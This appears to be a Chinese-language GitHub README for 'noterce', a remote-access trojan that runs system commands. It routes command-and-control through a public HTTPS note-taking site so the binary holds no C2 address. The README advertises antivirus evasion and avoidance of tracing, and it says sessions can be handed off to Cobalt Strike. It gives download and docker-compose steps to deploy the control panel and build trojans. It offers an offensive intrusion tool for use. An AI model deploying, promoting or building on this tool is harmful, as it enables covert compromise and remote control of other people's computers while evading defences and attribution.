# noterce
一种另辟蹊径的免杀执行系统命令的木马,通过https“公开笔记”网站来交互通信交互

# 免杀效果
目前实测可过核晶和火绒
<img width="1189" alt="图片" src="https://github.com/xiao-zhu-zhu/noterce/assets/85468097/3733e1b2-b383-4cf4-8aa6-687b0a94cfc0">
<img width="1098" alt="图片" src="https://github.com/xiao-zhu-zhu/noterce/assets/85468097/1c22fdea-2622-4c51-a174-6053ba9a3d4f">


## 优缺点
优点:
- 免杀
- 有效避免被溯源
- AES加密
- 二进制木马不包含c2地址,通过noterce传递c2指令

缺点:
- 15秒执行一次命令(但可直接上线cs)


## 0x02 部署



### 部署方式-docker

[noterce前端](https://github.com/xiao-zhu-zhu/noterce-amis)
启动命令:

```sh
curl -LjO https://github.com/xiao-zhu-zhu/noterce/releases/download/1.3/noterce.zip
unzip noterce.zip
cd noterce
docker-compose up -d

#端口默认为8888
#可在docker-compose.yaml更改port
```





## 0x03 使用

- 打开部署好的网站
<img width="1230" alt="图片" src="https://github.com/xiao-zhu-zhu/noterce/assets/85468097/63477782-9faf-48eb-8764-c42073403dce">
- 把木马的配置都填好后,点击木马下载
<img width="1059" alt="图片" src="https://github.com/xiao-zhu-zhu/noterce/assets/85468097/ba5d9895-7e73-48c9-8da5-33dcc56541b9">
- 命令执行方法(需要等待20秒,可多行执行命令)
<img width="1230" alt="图片" src="https://github.com/xiao-zhu-zhu/noterce/assets/85468097/0ef38e95-6c49-46bf-950a-e1ecd397d990">
- cs上线
<img width="1205" alt="图片" src="https://github.com/xiao-zhu-zhu/noterce/assets/85468097/b58dd11f-e3ff-4272-ac9d-5ec9e6f0b2e8">
